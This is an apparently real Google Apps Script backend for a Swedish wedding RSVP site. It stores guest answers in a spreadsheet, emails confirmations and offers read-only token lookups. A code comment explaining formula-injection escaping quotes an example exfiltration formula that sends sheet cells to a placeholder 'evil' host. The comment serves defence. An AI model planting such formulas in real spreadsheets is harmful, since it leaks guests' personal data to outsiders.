/**
 * Bröllops-OSA — Google Apps Script backend.
 * En rad per gäst i "Svar"-bladet (varje gäst OSAr individuellt). Se
 * brollopssajt-spec.md för bakgrund, formuläret i index.html är facit för
 * vilka fält som faktiskt skickas in.
 *
 * Läsvänligt men skrivskyddat: varje inskick får en egen token som gästen
 * kan använda för att se (aldrig ändra) sina svar. Det finns ingen
 * skrivväg via token — vill en gäst ändra något, hör de av sig och
 * svaret redigeras manuellt i kalkylbladet.
 *
 * Deploy: clasp push && clasp deploy -i <deploymentId>
 * (Använd alltid samma deploymentId vid omdeploy, annars ändras webbapp-URL:en.
 * Aktiv deploymentId: AKfycbyCTvoCURXW_elUaGv7pH3yyb3UTMPX0SxKjKQy01dklX6wxTJd1UqQx8I4aq5REiDU)
 */

var SHEET_NAME = "Svar";

// Fyll i med sajtens faktiska URL (t.ex. "https://malinochsebastian.wedding/").
// Tom sträng gör att bekräftelsemailet länkar direkt till Apps Script-URL:en
// istället, vilket fungerar men inte visar den riktiga sajten.
var SITE_URL = "https://malinochsebastian.wedding/";

var COLUMNS = [
  "token",
  "tidsstämpel",
  "kommer",
  "namn",
  "email",
  "telefon",
  "allergier",
  "allergier_ovrigt",
  "alkohol",
  "buss_vigsel",
  "buss_natt",
  "meddelande",
];

function jsonOut(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON
  );
}

function getSheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(SHEET_NAME) || ss.getSheets()[0];
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(COLUMNS);
  }
  return sheet;
}

function columnIndexMap(sheet) {
  var header = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  var map = {};
  for (var i = 0; i < header.length; i++) {
    map[header[i]] = i; // 0-indexed
  }
  return map;
}

// Range.setValue() parses strings the same way the Sheets UI does, so a
// value starting with =, +, -, or @ becomes a formula instead of literal
// text. Since doPost accepts arbitrary JSON, every string must be escaped
// before it's written, or a submission could plant a formula (e.g.
// =IMAGE("https://evil/"&A1&B1)) that exfiltrates other guests' data or
// phishes whoever opens the sheet.
var FORMULA_TRIGGER_CHARS = ["=", "+", "-", "@"];

function sanitizeForSheet(value) {
  if (typeof value !== "string" || value.length === 0) return value;
  if (FORMULA_TRIGGER_CHARS.indexOf(value.charAt(0)) === -1) return value;
  return "'" + value;
}

function appendRow(sheet, map, data) {
  var rowIndex = sheet.getLastRow() + 1;
  Object.keys(data).forEach(function (key) {
    if (!(key in map)) return;
    sheet.getRange(rowIndex, map[key] + 1).setValue(sanitizeForSheet(data[key]));
  });
}

function findRowByToken(sheet, map, token) {
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return -1;
  var tokenCol = map["token"];
  var tokens = sheet.getRange(2, tokenCol + 1, lastRow - 1, 1).getValues();
  for (var i = 0; i < tokens.length; i++) {
    if (String(tokens[i][0]) === String(token)) {
      return i + 2; // 1-indexed sheet row
    }
  }
  return -1;
}

function rowToObject(sheet, map, rowIndex) {
  var values = sheet.getRange(rowIndex, 1, 1, sheet.getLastColumn()).getValues()[0];
  var obj = {};
  for (var key in map) {
    obj[key] = values[map[key]];
  }
  return obj;
}

function sendConfirmationEmail(data, token) {
  var viewLink = (SITE_URL || ScriptApp.getService().getUrl()) + "?t=" + token;

  var lines = [];
  lines.push("Hej " + data.namn + "!");
  lines.push("");
  lines.push("Tack för din OSA. Här är en sammanfattning av dina svar:");
  lines.push("");
  lines.push("Kommer: " + data.kommer);
  if (data.kommer === "Ja") {
    lines.push("Allergier/specialkost: " + (data.allergier || "-") + (data.allergier_ovrigt ? " (" + data.allergier_ovrigt + ")" : ""));
    lines.push("Alkohol: " + (data.alkohol || "-"));
    lines.push("Buss kyrka -> slott: " + (data.buss_vigsel || "-"));
    lines.push("Buss slott -> T-centralen (01:15): " + (data.buss_natt || "-"));
    if (data.meddelande) lines.push("Meddelande: " + data.meddelande);
  }
  lines.push("");
  lines.push("Du kan se dina svar när som helst via länken nedan (går inte att ändra där):");
  lines.push(viewLink);
  lines.push("Behöver du ändra något, hör bara av dig direkt till oss.");
  lines.push("");
  lines.push("Varmt välkommen!");
  lines.push("Malin & Sebastian");

  MailApp.sendEmail(data.email, "Din OSA till Malin & Sebastians bröllop", lines.join("\n"));
}

function doPost(e) {
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var data;
    try {
      data = JSON.parse(e.postData.contents);
    } catch (parseErr) {
      return jsonOut({ ok: false });
    }

    // Honeypot: tyst avvisning, ser ut som success för ev. bot.
    if (data.website) {
      return jsonOut({ ok: true });
    }

    if (!data.email || !data.namn || !data.kommer) {
      return jsonOut({ ok: false });
    }

    var sheet = getSheet();
    var map = columnIndexMap(sheet);

    var token = Utilities.getUuid();
    data.token = token;
    data.tidsstämpel = new Date();
    appendRow(sheet, map, data);

    sendConfirmationEmail(data, token);

    return jsonOut({ ok: true });
  } catch (err) {
    return jsonOut({ ok: false });
  } finally {
    lock.releaseLock();
  }
}

function doGet(e) {
  var token = e.parameter.t;
  if (!token) {
    return jsonOut({ found: false });
  }

  var sheet = getSheet();
  var map = columnIndexMap(sheet);
  var rowIndex = findRowByToken(sheet, map, token);
  if (rowIndex < 0) {
    return jsonOut({ found: false });
  }

  var obj = rowToObject(sheet, map, rowIndex);
  obj.found = true;
  return jsonOut(obj);
}
